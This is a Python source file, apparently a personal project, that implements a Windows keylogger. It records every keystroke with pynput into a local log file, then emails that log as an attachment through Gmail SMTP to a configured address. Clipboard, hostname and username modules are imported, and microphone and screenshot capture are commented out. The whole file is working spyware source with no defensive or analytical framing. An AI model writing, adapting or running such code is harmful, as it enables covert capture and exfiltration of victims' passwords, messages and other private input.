# Libraries
#email
#multi-internet mail extention--- internet protocol allows mail to support audio image video and text  
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
#comp info
import socket
import platform
#from requests import get
#get user Name
import getpass
#microphone
#import sounddevice as sd
#from scipy.io.wavfile import write
#clipboard
import win32clipboard
#image
#import pyscreenshot as ImageGrab
#keystrokes listener
from pynput.keyboard import Key, Listener
from pynput import keyboard
# tracking time
import time
import os
#file encryption
#from cryptography.fernet import fernet

#creating file to store log and file path
keys_information ="key_log.txt"
file_path = "C:\\Users\\Netsi\\Desktop\\YN\\hilcoe\\Github\\keylogger-updated-"
#allows to add an extention to access keylog.txt file
extend ="\\"



#creating a keylogger
count = 0
keys=[]

def on_press(key):
    global keys,count 

    print(key)
    keys.append(key)
    count += 1
#add new keys to file
    if count >=1:
        count =0
        write_file(keys)
        keys=[]

#write on keylog file
def write_file(keys):
    with open(file_path+extend +keys_information,"a") as f:
        for key in keys:
            #readable file 
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find ("key") == -1:
                f.write(k)
                f.close()
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()

#email
email_address="your_email@example.com"
password =                                                                                                                                                                                                                     "your_app_specific_password"
toaddr ="your_email@example.com"

def send_email(filename,attachment,toaddr):
    fromaddr= email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['subject'] = "kLog File"
    #body of mail
    body = "Boddy_of_the_mail"

    msg.attach(MIMEText(body,'plain'))

    filename = filename 
    attachment=open(attachment,"rb")

    p = MIMEBase('application','octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)
    msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()
send_email(keys_information,file_path+extend+keys_information,toaddr)
